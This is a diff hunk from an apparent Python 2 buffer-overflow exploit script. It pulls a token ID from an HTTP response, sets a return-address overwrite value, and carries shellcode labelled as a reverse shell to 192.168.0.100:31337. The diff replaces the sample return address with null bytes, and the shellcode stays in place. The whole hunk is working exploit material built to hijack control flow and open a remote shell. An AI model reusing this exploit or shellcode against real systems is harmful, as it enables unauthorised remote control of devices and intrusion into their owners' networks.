@@ -41,8 +41,8 @@ for l in r.content.split('\n'):
         tokenid = l[q1+1:q2]
 print 'tokenid is %s' % tokenid
 
-# The return address will be overwritten as newRet (sample:0x0048fba8)
-newRet = '\xa8\xfb\x48\x00'
+# The return address will be overwritten as newRet 
+newRet = '\x00\x00\x00\x00'
 
 # Reverse shell to 192.168.0.100:31337
 shellcode = "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
